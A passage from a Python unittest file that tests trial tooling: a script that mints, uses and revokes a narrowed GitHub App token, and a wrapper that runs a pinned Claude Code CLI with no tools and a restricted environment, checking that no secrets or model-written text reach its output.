            self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: elsewhere, "sim/grounding.py": p99})),
                                   "P-99 has no row in section 6"))
        root = clone({})
        (root / check_trials.DESIGN).write_bytes(b"\xff\xfe| P-41 |\n")
        self.assertTrue(caught(check_trials.run(root), "%s cannot be read" % check_trials.DESIGN))
        asked = GROUNDING.replace("RULES = (", 'RULES = (\n    ("a_rule_nobody_asks", "It is so", ("P-1",), None, "%sx"),' % check_trials.ASSUMED, 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": asked, "sim/world.py": world})),
                               "a_rule_nobody_asks: a trial asks this, or a fixture grounds it, so it says nothing of why none can"))
        # The list verify prints says, for each rule no fixture grounds, the trials that ask it or why none can.
        lines = {line.split(":", 1)[0]: line for line in check_trials.unverified(clone({"sim/grounding.py": said, "sim/world.py": world}))}
        self.assertIn("(%sa race no trial can force)" % check_trials.ASSUMED, lines["a_rule_nobody_asks"])
        self.assertIn("(asked by P-2, P-41, no fixture yet)", lines["the_timeline_shows_each_act"])
        for code, _, trials, fixture, note in check_trials.rules():
            self.assertTrue(trials or fixture is not None or (isinstance(note, str) and note.startswith(check_trials.ASSUMED)), code)
            self.assertTrue(not trials or note is None, code)

    def test_verify_prints_every_rule_no_fixture_grounds(self):
        listed = check_trials.rules()
        codes = [code for code, _, _, fixture, _ in listed if fixture is None]
        grounded = [code for code, _, _, fixture, _ in listed if fixture is not None]
        self.assertTrue(codes)
        self.assertEqual(len(check_trials.unverified()), len(codes))
        ran = {}

        class Runner:
            def __init__(self, **_):
                pass

            def run(self, suite):
                ran["suite"] = suite
                return unittest.TestResult()

        real = (verify.failed, verify.unittest.TextTestRunner)
        verify.failed, verify.unittest.TextTestRunner = (lambda checks: False), Runner
        try:
            with contextlib.redirect_stdout(io.StringIO()) as said:
                self.assertEqual(verify.main([]), 0)
        finally:
            verify.failed, verify.unittest.TextTestRunner = real
        for code in codes:
            self.assertIn("unverified: " + code, said.getvalue())
        for code in grounded:
            self.assertNotIn("unverified: %s:" % code, said.getvalue())

    def test_the_check_runs_alone_before_anything_is_added(self):
        with contextlib.redirect_stdout(io.StringIO()) as said:
            self.assertEqual(check_trials.main(ROOT), 0)
            self.assertEqual(check_trials.main(clone({"trials/notes.txt": "x\n"})), 1)
        self.assertIn("trials/notes.txt", said.getvalue())

    def test_only_a_fixture_may_name_a_model_or_the_proof_of_concept(self):
        said = json.dumps({"model": "claude-" + "opus-5-5", "repo": "combsmith/" + check_repo.FOREIGN})
        problems = check_repo.run(tree({"trials/P-13.json": said, "trials/old/P-13.json": said, "trials/P-13.txt": said,
                                        "config/x.json": said}))
        for where in ("trials/old/P-13.json", "trials/P-13.txt", "config/x.json"):
            self.assertTrue(caught(problems, where + ": names a model"), where)
            self.assertTrue(caught(problems, where + ": names the proof-of-concept repo"), where)
        self.assertFalse(caught(problems, "trials/P-13.json"))


class NarrowedToken(unittest.TestCase):
    """`tools/trial_p4_narrow.sh` mints one narrowed token at the Maintainer's terminal, reads with it and revokes it.
    Here it runs against a stand-in curl and openssl, which answer by method and path and record each call."""

    TOKEN = "gh" + "s_" + "F" * 36

    def stand_in(self, mint_status="201", mint_body=None, revoke_status="204", statuses=None) -> pathlib.Path:
        """A directory holding a curl that answers by URL and an openssl that signs nothing real."""
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name))
        (folder / "bin").mkdir()
        mint_body = mint_body if mint_body is not None else json.dumps(
            {"token": self.TOKEN, "expires_at": "2026-10-21T00:00:00Z", "permissions": {"contents": "read"},
             "repository_selection": "selected"})
        answers = {"GET repos/x/canary/contents/": ("200", '[{"name":"trial-notes","type":"dir"}]'),
                   "PUT repos/x/canary/contents/p4/trial.md": ("403", '{"message":"Resource not accessible by integration"}'),
                   "GET repos/x/other/contents/": ("404", '{"message":"Not Found"}')}
        answers.update(statuses or {})
        (folder / "answers.json").write_text(json.dumps(answers))
        (folder / "bin" / "openssl").write_text("#!/bin/sh\ncase \"$1\" in base64) exec /usr/bin/openssl \"$@\" ;; dgst) printf 'sig' ;; *) exit 1 ;; esac\n")
        (folder / "bin" / "curl").write_text('''#!/bin/sh
here=$(dirname "$0")/..
cat > /dev/null
method=GET; url=""; include=0; out=""; w=""; data=""
all="$*"
while [ $# -gt 0 ]; do
  case "$1" in -X) method=$2; shift ;; -i) include=1 ;; -o) out=$2; shift ;; -w) w=$2; shift ;; -H) shift ;; --data-binary) data=$2; shift ;; http*) url=$1 ;; esac
  shift
done
set -- $all
printf '%s %s\\n' "$method" "$url" >> "$here/calls"
printf '%s\\n' "$*" >> "$here/argv"
path=${url#https://api.github.com/}
case "$method $path" in
  "GET repos/"*"/installation") body='{"id": 7, "app_id": 5363178}'; status=200 ;;
  "POST app/installations/7/access_tokens") cp "${data#@}" "$here/mint.request"; body=$(cat "$here/mint.body"); status=$(cat "$here/mint.status") ;;
  "DELETE installation/token") body=""; status=$(cat "$here/revoke.status") ;;
  *) pair=$(python3 -c 'import json,sys; a=json.load(open(sys.argv[1])); k=sys.argv[2]; print(a[k][0] + " " + a[k][1] if k in a else "500 {}")' "$here/answers.json" "$method $path"); status=${pair%% *}; body=${pair#* } ;;
esac
if [ -n "$out" ]; then printf '%s' "$body" > "$out"
elif [ "$include" = 1 ]; then printf 'HTTP/2 %s\\r\\ndate: Tue, 20 Oct 2026 23:00:00 GMT\\r\\ncontent-type: application/json\\r\\n\\r\\n%s' "$status" "$body"
else printf '%s' "$body"; fi
[ -n "$w" ] && printf "$(printf '%s' "$w" | sed "s/%{http_code}/$status/")"
exit 0
''')
        (folder / "mint.body").write_text(mint_body)
        (folder / "mint.status").write_text(mint_status)
        (folder / "revoke.status").write_text(revoke_status)
        for name in ("curl", "openssl"):
            (folder / "bin" / name).chmod(0o755)
        (folder / "key.pem").write_text("not a key\n")
        return folder

    def run_script(self, folder: pathlib.Path, *args, out="out") -> subprocess.CompletedProcess:
        env = {"PATH": "%s:%s" % (folder / "bin", os.environ["PATH"]), "HOME": str(folder), "LANG": "C"}
        return subprocess.run(["sh", str(ROOT / "tools" / "trial_p4_narrow.sh"), str(folder / out), str(folder / "key.pem"), *args],
                              capture_output=True, text=True, env=env, cwd=str(folder), stdin=subprocess.DEVNULL, timeout=60)

    def test_a_narrowed_token_is_minted_used_three_times_and_revoked_and_never_kept(self):
        folder = self.stand_in()
        done = self.run_script(folder, "x/canary", "x/other")
        self.assertEqual(done.returncode, 0, done.stderr)
        calls = (folder / "calls").read_text().splitlines()
        self.assertEqual([c.split(" ", 1)[0] for c in calls], ["GET", "POST", "GET", "PUT", "GET", "DELETE"])
        self.assertTrue(calls[1].endswith("/app/installations/7/access_tokens"))
        self.assertTrue(calls[-1].endswith("/installation/token"))
        asked = json.loads((folder / "out" / "requests.json").read_text())
        self.assertEqual(asked["revoked"], "204")
        self.assertEqual(asked["narrowed_to"], {"repositories": ["canary"], "permissions": {"contents": "read"}})
        # What the mint asked GitHub for, as the stand-in received it: the subset, not the script's own report of it.
        self.assertEqual(json.loads((folder / "mint.request").read_text()),
                         {"repositories": ["canary"], "permissions": {"contents": "read"}})
        self.assertEqual([r["status"] for r in asked["reads"]], ["200", "201", "200", "403", "404"])
        kept = "".join(p.read_text() for p in (folder / "out").iterdir())
        self.assertNotIn(self.TOKEN, kept)
        self.assertNotIn(self.TOKEN, done.stdout + done.stderr)
        minted = json.loads((folder / "out" / "clean-2").read_text().split("\n\n", 1)[1])
        self.assertEqual(minted, {"expires_at": "2026-10-21T00:00:00Z", "permissions": {"contents": "read"},
                                  "repository_selection": "selected"})
        self.assertEqual(sorted(p.name for p in (folder / "out").iterdir()),
                         ["clean-1", "clean-2", "clean-3", "clean-4", "clean-5", "ran_at", "redacted-1", "redacted-2",
                          "redacted-3", "redacted-4", "redacted-5", "requests.json"])
        # No call carried the token, or a header that could, among curl's arguments: it reaches curl on stdin alone.
        argv = (folder / "argv").read_text()
        self.assertNotIn(self.TOKEN, argv)
        self.assertNotIn("Authorization", argv)

    def test_each_refusal_stops_before_anything_is_minted(self):
        folder = self.stand_in()
        (folder / "exists").mkdir()
        for label, args, said in (
                ("OUT exists", ("x/canary", "x/other"), "exists; name a new directory"),
                ("a bad repo name", ("x/canary", "evil/*"), "is not OWNER/REPO"),
                ("the same repo twice", ("x/canary", "x/canary"), "must differ"),
                ("too few arguments", ("x/canary",), "usage:")):
            out = "exists" if label == "OUT exists" else "new-" + label.replace(" ", "-")
            done = self.run_script(folder, *args, out=out)
            self.assertEqual(done.returncode, 2, label)
            self.assertIn(said, done.stderr, label)
        self.assertFalse((folder / "calls").exists(), "a refusal made a call")
        done = subprocess.run(["sh", str(ROOT / "tools" / "trial_p4_narrow.sh"), str(folder / "new"), str(folder / "missing.pem"),
                               "x/canary", "x/other"], capture_output=True, text=True,
                              env={"PATH": "%s:%s" % (folder / "bin", os.environ["PATH"]), "HOME": str(folder)}, cwd=str(folder))
        self.assertEqual(done.returncode, 2)
        self.assertIn("cannot read the key file", done.stderr)

    def test_a_refused_mint_stops_with_nothing_read_and_the_answer_redacted(self):
        folder = self.stand_in(mint_status="401", mint_body='{"message": "Bad credentials"}')
        done = self.run_script(folder, "x/canary", "x/other")
        self.assertEqual(done.returncode, 1)
        self.assertIn("no token was read from the mint (status 401)", done.stderr)
        calls = (folder / "calls").read_text().splitlines()
        self.assertEqual([c.split(" ", 1)[0] for c in calls], ["GET", "POST"], "a read was made with no token")
        self.assertIn("Bad credentials", (folder / "out" / "clean-2").read_text())

    def test_a_revocation_that_is_not_204_is_told_and_fails(self):
        folder = self.stand_in(revoke_status="500")
        done = self.run_script(folder, "x/canary", "x/other")
        self.assertEqual(done.returncode, 1)
        self.assertIn("returned 500, not 204", done.stderr)
        self.assertIn("revoke it by hand", done.stderr)
        self.assertNotIn(self.TOKEN, done.stdout + done.stderr)

    def test_a_reads_status_is_the_answer_whatever_it_is(self):
        # A read of the other repo answered 200 is not refused by the script: the fixture's verdict judges it.
        folder = self.stand_in(statuses={"GET repos/x/other/contents/": ("200", '[{"name":"README.md","type":"file"}]')})
        done = self.run_script(folder, "x/canary", "x/other")
        self.assertEqual(done.returncode, 0, done.stderr)
        asked = json.loads((folder / "out" / "requests.json").read_text())
        self.assertEqual([r["status"] for r in asked["reads"]][-1], "200")

class TrialScript(unittest.TestCase):
    """`tools/trial_p13_cli.sh`, run against a stand-in CLI and never the real one (issue 178): the environment the CLI is
    given, each refusal before anything is asked, the login that must say yes, and the answer kept by allowlist so that
    no model text reaches OUT."""

    SCRIPT = ROOT / "tools" / "trial_p13_cli.sh"
    PIN = re.search(r"^PIN=(\S+)$", SCRIPT.read_text(), re.M).group(1)
    STAND_IN = """#!/bin/sh
here=$(cd "$(dirname "$0")" && pwd)
case "$1" in
  --version) env > "$here/env-version"; cat "$here/version"; exit "$(cat "$here/version.exit")" ;;
  --after) cp "$here/version.after" "$here/version" ;;
  auth) env > "$here/env-auth"; cat "$here/status"; exit "$(cat "$here/status.exit")" ;;
  -p) env > "$here/env-task"; printf '%s\\n' "$@" > "$here/args"; cat "$here/stderr" >&2; cat "$here/answer"
      [ -f "$here/version.after" ] && cp "$here/version.after" "$here/version"
      [ -f "$here/version.after.exit" ] && cp "$here/version.after.exit" "$here/version.exit"; exit "$(cat "$here/answer.exit")" ;;
esac
exit 9
"""
    VALID = {"schema": "result/1", "run": "r_p13", "status": "completed",
             "dispositions": [{"finding": "f_9c1e", "decision": {"result": "accepted"}}]}
    # The keys under which a kept field may hold a string, pinned here on its own: the ones the run at 2.1.306 found holding
    # one, and tool_name, reached only when a tool is refused (issue 247). Naming another is a change to this test.
    STRING_KEYS = ["type", "subtype", "stop_reason", "tool_name", "service_tier", "inference_geo", "speed", "canonicalModel",
                   "provider", "costBasis"]
    # What the script keeps of the Task's answer, pinned here on its own: widening KEPT_RESULT is a change to this test.
    KEPT = ["type", "subtype", "is_error", "num_turns", "duration_ms", "duration_api_ms", "total_cost_usd", "usage",
            "modelUsage", "stop_reason", "permission_denials", "structured_output"]
    # Words the model might say, planted where a careless script would let them through.
    PROSE = {"result": "the model wrote THIS-PROSE-1 here", "added": "a field the CLI adds carries THIS-PROSE-2",
             "nested": "THIS-PROSE-3 in a nested field", "denied": "THIS-PROSE-4 in a refused tool's input",
             "invalid": "THIS-PROSE-5 in a structured output that does not validate",
             "in_usage": "THIS-PROSE-6 in a string under the counts", "in_code": "THIS-PROSE-7 where a code should be",
             "tabbed": "THIS-PROSE-8\tset\tapart\tby\ttabs", "as_key": "THIS-PROSE-9 as a key",
             "long": "THIS-PROSE-10-" + "z" * 90, "stderr": "THIS-PROSE-11 the model said on standard error",
             "under_model": "THIS-PROSE-12-a-word-under-model"}

    def answer(self, output=None, **extra) -> dict:
        said = {"type": "result", "subtype": "success", "is_error": False, "num_turns": 1, "duration_ms": 5,
                "total_cost_usd": 0.1, "usage": {"input_tokens": 1, "output_tokens": 2, "evil.provider": "LEAKED-DOTTED-KEY",
                                                "provider": ["LEAKWORD1", "LEAKWORD2"]},
                "modelUsage": {"m": {"inputTokens": 1, "note": self.PROSE["in_usage"], "fallback": None, "provider": "firstParty",
                                     "note2": "LEAK-ONE-WORD", "canonicalModel": self.PROSE["long"],
                                     "model": self.PROSE["under_model"]},
                               "sk-" + "ant-" + "api03-NEVER-SEEN": {"inputTokens": 2}, self.PROSE["as_key"]: 3},
                "stop_reason": self.PROSE["in_code"], "subtype": self.PROSE["tabbed"], "result": self.PROSE["result"],
                "a_new_field": self.PROSE["added"], "stats": {"note": self.PROSE["nested"]},
                "permission_denials": [{"tool_name": "Bash", "tool_input": {"command": self.PROSE["denied"]}}]}
        if output is not None:
            said["structured_output"] = output
        said.update(extra)
        return said

    def stand_in(self, version=None, status=None, status_exit=0, answer=None, answer_exit=0, version_exit=0, after=None,
                 after_exit=None) -> pathlib.Path:
        """A directory holding the stand-in `claude` and what it answers; it records the environment and arguments it is
        given beside itself."""
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "version").write_text("%s (Claude Code)\n" % (version or self.PIN))
        (folder / "version.exit").write_text("%d\n" % version_exit)
        (folder / "stderr").write_text(self.PROSE["stderr"] + "\n")
        if after is not None:                     # the version the CLI says after the Task, if it changed
            (folder / "version.after").write_text("%s (Claude Code)\n" % after)
        if after_exit is not None:                # how the CLI's --version exits after the Task
            (folder / "version.after.exit").write_text("%d\n" % after_exit)
        (folder / "status").write_text(json.dumps({"loggedIn": True, "authMethod": "claude.ai"} if status is None else status))
        (folder / "status.exit").write_text("%d\n" % status_exit)
        (folder / "answer").write_text(json.dumps(self.answer(self.VALID) if answer is None else answer))
        (folder / "answer.exit").write_text("%d\n" % answer_exit)
        cli = folder / "claude"
        cli.write_text(self.STAND_IN)
        cli.chmod(0o755)
        return folder

    def run_script(self, out, cfg, cli, home=None) -> subprocess.CompletedProcess:
        """The script as the Maintainer runs it, from a shell that holds a key the CLI must never see."""
        env = {"PATH": os.environ["PATH"], "HOME": str(home or self.home), "LANG": "C",
               "ANTHROPIC_API_KEY": "sk-" + "ant-" + "api03-NEVER-SEEN", "GH_TOKEN": "gh" + "p_NEVER-SEEN"}
        return subprocess.run(["bash", str(self.SCRIPT), str(out), str(cfg), str(cli)], cwd=SCRATCH.name,
                              capture_output=True, text=True, env=env, timeout=120)

    # OUT names the refusal cases give inside the repo. A broken script could make one, in a copy the mutation check
    # lends to the next mutant, so each is removed after the test whether or not it was refused.
    INSIDE = ("never-made-in-the-repo", "never-made-through-a-link")

    def setUp(self):
        self.home = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        self.cfg = self.home.parent / (self.home.name + "-cfg")
        self.cfg.mkdir()
        self.out = self.home.parent / (self.home.name + "-out")

    def tearDown(self):
        for name in self.INSIDE:
            shutil.rmtree(ROOT / name, ignore_errors=True)

    def texts(self, out) -> dict:
        return {p.name: p.read_text() for p in pathlib.Path(out).iterdir()}

    def test_every_script_pins_the_cli_at_one_version(self):
        # Decision 0033: the engine port is pinned to one version of the CLI, and every script that runs it runs that one,
        # so a pin moved in one script and left in another is caught here.
        pins = {}
        for path in sorted((ROOT / "tools").glob("*.sh")):
            found = re.search(r"^PIN=(\S+)$", path.read_text(), re.M)
            if found:
                pins[path.name] = found.group(1)
        self.assertLessEqual({"trial_p13_cli.sh", "context_eval.sh"}, set(pins))
        self.assertEqual(set(pins.values()), {self.PIN}, pins)
        # The Engine runs at the pin the trials ran at: config/harness.json holds the same version (CodeRabbit's read).
        harness = json.loads((ROOT / "config" / "harness.json").read_text())
        self.assertEqual(harness["engine"]["version"], self.PIN)
        # The pin moves only by a run of P-13 at the new version: it is the version the newest P-13 fixture ran at, before
        # and after its Task, and that run passed.
        runs = sorted((json.loads(p.read_text()) for p in (ROOT / "trials").glob("P-13*.json")), key=lambda f: f["ran_at"])
        pinned = [next(e for e in f["exchanges"] if e["request"]["call"].startswith("claude -p"))["request"]["body"]["pinned"]
                  for f in runs]
        newest = runs[-1]
        checked = newest["exchanges"][-1]["response"]["body"]                # the script's own check, the version held
        held = checked.get("version", {}).get("held") if isinstance(checked, dict) else None
        self.assertEqual((newest["verdict"], pinned[-1], newest["exchanges"][0]["response"]["body"], held),
                         ("pass", self.PIN, self.PIN + " (Claude Code)", True))
        # The older runs are kept beside it, each at the version it ran at: a pin that moved has its earlier run still.
        self.assertGreaterEqual(len(set(pinned)), 2, pinned)

    def test_the_cli_is_given_only_the_named_environment_and_no_tool(self):
        folder = self.stand_in()
        ran = self.run_script(self.out, self.cfg, folder / "claude")
        self.assertEqual(ran.returncode, 0, ran.stderr)
        named = {"HOME", "USER", "LOGNAME", "SHELL", "PATH", "TMPDIR", "LANG", "CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER"}
        shell_adds = {"PWD", "OLDPWD", "SHLVL", "_"}
        for call in ("version", "auth", "task"):
            given = dict(line.split("=", 1) for line in (folder / ("env-" + call)).read_text().splitlines() if "=" in line)
            self.assertEqual(set(given) - shell_adds, named, call)
            self.assertEqual((given["CLAUDE_CONFIG_DIR"], given["DISABLE_AUTOUPDATER"]), (str(self.cfg), "1"), call)
            self.assertNotIn("NEVER-SEEN", (folder / ("env-" + call)).read_text(), call)
        args = (folder / "args").read_text().split("\n")
        self.assertEqual(args[args.index("--tools") + 1], "", "the model is given no tool")
        self.assertIn("--json-schema", args)
        self.assertNotIn("NEVER-SEEN", "".join(self.texts(self.out).values()))

    def test_each_refusal_stops_before_anything_is_asked(self):
        folder = self.stand_in()
        cli = folder / "claude"
        existing = self.home.parent / (self.home.name + "-taken")
        existing.mkdir()
        under_home = self.home / "sub"
        under_home.mkdir()
        dot_claude = self.home / ".claude" / "deep"
        dot_claude.mkdir(parents=True)
        linked = self.home.parent / (self.home.name + "-link")
        linked.symlink_to(self.home / ".claude")
        try:                                      # on a file system that tells case, a directory of its own
            (self.home / ".CLAUDE").mkdir()
        except FileExistsError:                   # on one that does not, the Maintainer's own, under another name
            pass
        to_repo = self.home.parent / (self.home.name + "-repo-link")
        to_repo.symlink_to(ROOT)
        home_link = self.home.parent / (self.home.name + "-home-link")
        home_link.symlink_to(self.home)
        elsewhere = pathlib.Path(tempfile.mkdtemp()).resolve()       # a link to HOME from outside CONFIG_DIR
        self.addCleanup(shutil.rmtree, elsewhere, True)
        far_link = elsewhere / "home-link"
        far_link.symlink_to(self.home)
        other_home = self.home.parent / (self.home.name + "-other-home")     # whose ~/.claude is itself a link
        other_home.mkdir()
        real_claude = self.home.parent / (self.home.name + "-real-claude")
        real_claude.mkdir()
        (other_home / ".claude").symlink_to(real_claude)
        cases = [("OUT exists", existing, self.cfg, None, "exists; name a new directory"),
                 ("OUT inside the repo", ROOT / self.INSIDE[0], self.cfg, None, "OUT is inside the repo"),
                 ("OUT inside the repo through a link", to_repo / self.INSIDE[1], self.cfg, None, "OUT is inside the repo"),
                 ("OUT inside CONFIG_DIR", self.cfg / "out", self.cfg, None, "OUT is inside CONFIG_DIR"),
                 ("CONFIG_DIR inside the repo", self.out, ROOT / "tools", None, "CONFIG_DIR is inside the repo"),
                 ("CONFIG_DIR is HOME", self.out, self.home, None, "the home directory or holds it"),
                 ("CONFIG_DIR holds HOME", self.out, self.home.parent, under_home, "the home directory or holds it"),
                 ("CONFIG_DIR is /", self.out, pathlib.Path("/"), None, "the home directory or holds it"),
                 ("CONFIG_DIR is ~/.claude", self.out, self.home / ".claude", None, "under ~/.claude"),
                 ("CONFIG_DIR under ~/.claude", self.out, dot_claude, None, "under ~/.claude"),
                 ("CONFIG_DIR linked to ~/.claude", self.out, linked, None, "under ~/.claude"),
                 ("HOME through a link, CONFIG_DIR its ~/.claude", self.out, self.home / ".claude", home_link, "under ~/.claude"),
                 ("HOME through a link from elsewhere, CONFIG_DIR holding the real home", self.out, self.home.parent, far_link,
                  "the home directory or holds it"),
                 ("~/.claude a link, CONFIG_DIR where it leads", self.out, real_claude, other_home, "under ~/.claude"),
                 ("CONFIG_DIR is ~/.CLAUDE", self.out, self.home / ".CLAUDE", None, "under ~/.claude"),
                 ("CONFIG_DIR missing", self.out, self.home / "none", None, "CONFIG_DIR is not a directory")]
        for name, out, cfg, home, said in cases:
            ran = self.run_script(out, cfg, cli, home=home)
            self.assertEqual(ran.returncode, 2, (name, ran.stdout, ran.stderr))
            self.assertIn(said, ran.stderr, (name, ran.stdout, ran.stderr))
            self.assertFalse(out.exists() and out != existing, name)
            self.assertFalse((folder / "env-version").exists(), name + ": nothing was asked")
        # The wrong version, a login that says no, and one the script cannot read: each after asking, before the Task.
        for name, folder, code, said in [
                ("wrong version", self.stand_in(version="0.0.1"), 1, "is version '0.0.1', exit 0, not " + self.PIN),
                ("version not given", self.stand_in(version_exit=3), 1, "is version '%s', exit 3, not " % self.PIN),
                ("not logged in", self.stand_in(status={"loggedIn": False}), 1, "login under CONFIG_DIR is 'no', exit 0"),
                ("unknown status", self.stand_in(status={"something": "else"}), 1, "is 'unknown', exit 0"),
                ("status not json", self.stand_in(status="not json"), 1, "is 'unknown', exit 0"),
                ("logged in as a number", self.stand_in(status={"loggedIn": 1, "authMethod": "someone@example.com via prose words"}), 1,
                 "is 'unknown', exit 0"),
                ("auth status failed", self.stand_in(status_exit=3), 1, "is 'yes', exit 3, not yes")]:
            out = self.home.parent / (self.home.name + "-" + name.replace(" ", "-"))
            ran = self.run_script(out, self.cfg, folder / "claude")
            self.assertEqual(ran.returncode, code, (name, ran.stdout, ran.stderr))
            self.assertIn(said, ran.stderr, (name, ran.stdout, ran.stderr))
            self.assertFalse((folder / "args").exists(), name + ": the Task was not asked")
            self.assertNotIn("NEVER-SEEN", "".join(self.texts(out).values()), name)
            self.assertNotIn("example.com", "".join(self.texts(out).values()), name)
        # A login that says yes with prose beside it: the prose is dropped, the run goes on.
        folder = self.stand_in(status={"loggedIn": True, "authMethod": "claude.ai", "subscriptionType": "max but said in words"})
        out = self.home.parent / (self.home.name + "-prose-status")
        self.assertEqual(self.run_script(out, self.cfg, folder / "claude").returncode, 0)
        self.assertEqual(json.loads((out / "clean-2").read_text()), {"loggedIn": True, "authMethod": "claude.ai"})

    def test_a_reason_is_the_one_code_the_task_names(self):
        # Issue 247: a reason in the structured output is fix_incomplete, the code the Task names, and no other word, so
        # an output that validates cannot carry a word of the model's as a reason.
        schema = json.loads(re.search(r"^SCHEMA=\$\(cat <<'EOF'\n(.*?)\nEOF$", self.SCRIPT.read_text(), re.M | re.S).group(1))
        rejected = dict(self.VALID, dispositions=[{"finding": "f_22ab", "decision": {"result": "rejected", "reason": "fix_incomplete"}}])
        self.assertEqual(validate(rejected, schema), [])
        for word in ("this_is_model_text", "accepted", "fix_incomplete_"):
            told = dict(self.VALID, dispositions=[{"finding": "f_22ab", "decision": {"result": "rejected", "reason": word}}])
            self.assertNotEqual(validate(told, schema), [], word)

    def test_the_logins_exit_code_is_recorded(self):
        folder = self.stand_in()
        self.assertEqual(self.run_script(self.out, self.cfg, folder / "claude").returncode, 0)
        checked = json.loads((self.out / "checked.json").read_text())
        self.assertEqual(checked["login"], {"exit": 0, "status": "yes"})
        self.assertTrue(checked["every_part_holds"])
        folder = self.stand_in(status_exit=3)
        out = self.home.parent / (self.home.name + "-failed-login")
        self.assertEqual(self.run_script(out, self.cfg, folder / "claude").returncode, 1)
        checked = json.loads((out / "checked.json").read_text())
        self.assertEqual((checked["login"], checked["every_part_holds"]), ({"exit": 3, "status": "yes"}, False))
        # The version asked after the Task must still be the pin: a CLI that changed under the run does not hold.
        folder = self.stand_in(after="9.9.9")
        out = self.home.parent / (self.home.name + "-moved-version")
        self.assertEqual(self.run_script(out, self.cfg, folder / "claude").returncode, 1)
        checked = json.loads((out / "checked.json").read_text())
        self.assertEqual((checked["version"]["after"], checked["version"]["held"], checked["every_part_holds"]), ("9.9.9", False, False))
        # Nor does one whose --version, after the Task, says the pin and exits otherwise: its exit is read (issue 247).
        folder = self.stand_in(after_exit=3)
        out = self.home.parent / (self.home.name + "-after-exit")
        self.assertEqual(self.run_script(out, self.cfg, folder / "claude").returncode, 1)
        version = json.loads((out / "checked.json").read_text())["version"]
        self.assertEqual((version["after"], version["after_exit"], version["held"]), (self.PIN, 3, False))

    def test_no_model_text_reaches_out_whether_or_not_the_output_validates(self):
        invalid = dict(self.VALID, prose=self.PROSE["invalid"])
        in_result = dict(self.answer(), result=json.dumps(self.VALID))
        del in_result["permission_denials"]
        for name, answer, code, validates, source in [("validates", self.answer(self.VALID), 0, True, "structured_output"),
                                                      ("does not validate", self.answer(invalid), 1, False, "structured_output"),
                                                      ("in result alone", in_result, 0, True, "result"),
                                                      ("no output", self.answer(), 1, False, None),
                                                      ("not json", "the model said THIS-PROSE-1 and nothing else", 1, False, None)]:
            folder = self.stand_in(answer=answer)
            out = self.home.parent / (self.home.name + "-" + name.replace(" ", "-"))
            ran = self.run_script(out, self.cfg, folder / "claude")
            self.assertEqual(ran.returncode, code, (name, ran.stderr))
            texts = self.texts(out)
            for word in self.PROSE.values():
                self.assertNotIn(word, "".join(texts.values()) + ran.stdout + ran.stderr, name)
            checked = json.loads(texts["checked.json"])
            self.assertEqual((checked["structured_output"]["validates"], checked["structured_output"]["from"]),
                             (validates, source), name)
            self.assertEqual(checked["stderr"], {"lines": 1, "characters": len(self.PROSE["stderr"]) + 1}, name)
            self.assertNotIn("clean-3.stderr", texts, name)
            if isinstance(answer, dict):
                kept = json.loads(texts["clean-3"])
                self.assertEqual(re.search(r'^KEPT_RESULT="([^"]*)"$', self.SCRIPT.read_text(), re.M).group(1).split(), self.KEPT)
                self.assertEqual(re.search(r'^STRING_KEYS="([^"]*)"$', self.SCRIPT.read_text(), re.M).group(1).split(),
                                 self.STRING_KEYS)
                allowed = set(self.KEPT)
                self.assertTrue(set(kept) <= allowed, (name, set(kept) - allowed))
                self.assertNotIn("subtype", kept, name)
                self.assertNotIn("a_new_field", kept, name)
                self.assertEqual(kept["modelUsage"], {"m": {"inputTokens": 1, "fallback": None, "provider": "firstParty"}}, name)
                self.assertNotIn("LEAK-ONE-WORD", "".join(texts.values()), name)
                self.assertNotIn("LEAKED-DOTTED-KEY", "".join(texts.values()), name)
                self.assertNotIn("LEAKWORD", "".join(texts.values()), name)
                self.assertEqual(kept["usage"], {"input_tokens": 1, "output_tokens": 2, "provider": []}, name)
                self.assertEqual([t for t in checked["model_text_removed"] if t["field"] in ("$.modelUsage.m.note", "$.modelUsage.m.note2", "$.modelUsage.m.canonicalModel", "$.modelUsage.m.model", "$.stop_reason", "$.modelUsage.<key>")],
                                 [{"field": "$.modelUsage.m.note", "characters": len(self.PROSE["in_usage"])},
                                  {"field": "$.modelUsage.m.note2", "characters": len("LEAK-ONE-WORD")},
                                  {"field": "$.modelUsage.m.canonicalModel", "characters": len(self.PROSE["long"])},
                                  {"field": "$.modelUsage.m.model", "characters": len(self.PROSE["under_model"])},
                                  {"field": "$.modelUsage.<key>", "characters": len(self.PROSE["as_key"])},
                                  {"field": "$.stop_reason", "characters": len(self.PROSE["in_code"])}], name)
                self.assertNotIn("stop_reason", kept, name)
                self.assertEqual(kept.get("permission_denials"), [{"tool_name": "Bash"}] if "permission_denials" in answer else None, name)
                self.assertEqual("structured_output" in kept, validates, name)
                self.assertTrue(any(t["field"].startswith("every field KEPT_RESULT") for t in checked["model_text_removed"]), name)
                # The record names nothing that is kept: the Result's own strings, or the refused tools' names.
                self.assertFalse([t for t in checked["model_text_removed"]
                                  if t["field"].startswith(("$.structured_output", "$.permission_denials"))], name)
        asked = json.loads((out / "requests.json").read_text())
        self.assertEqual(asked[2]["kept"], self.KEPT)
        self.assertIn('--tools ""', asked[2]["call"])
        self.assertEqual(asked[2]["env"]["CLAUDE_CONFIG_DIR"],
                         "a configuration directory of its own, logged in to the Maintainer's own subscription (decision 0033)")


class AppThreads(unittest.TestCase):
    """`tools/trial_as_app.sh threads` (issue 282), run against a stand-in gh, curl and openssl that act out GitHub's
    answers: the App opens a pull request and two review threads, resolves the first, deletes the second's first
    comment, and revokes its token; the token never reaches a command line, and every exchange is one the fixture
    check can read."""

    SCRIPT = ROOT / "tools" / "trial_as_app.sh"
    TOKEN = "ghs_" + "S" * 36
    REPO = "combsmith/" + check_trials.CANARY
    # The stand-in gh: what the App's installation is answered, from the state it keeps beside itself.
    GH = r'''#!/usr/bin/env python3
import json, os, pathlib, sys
here = pathlib.Path(__file__).resolve().parent
args = sys.argv[1:]
with open(here / "calls", "a") as calls:
    calls.write(json.dumps({"argv": args, "token": os.environ.get("GH_TOKEN")}) + "\n")
state = json.loads((here / "state").read_text()) if (here / "state").exists() else {"reviews": 0, "resolved": False, "reply": False, "deleted": False}
def answer(status, body):
    (here / "state").write_text(json.dumps(state))
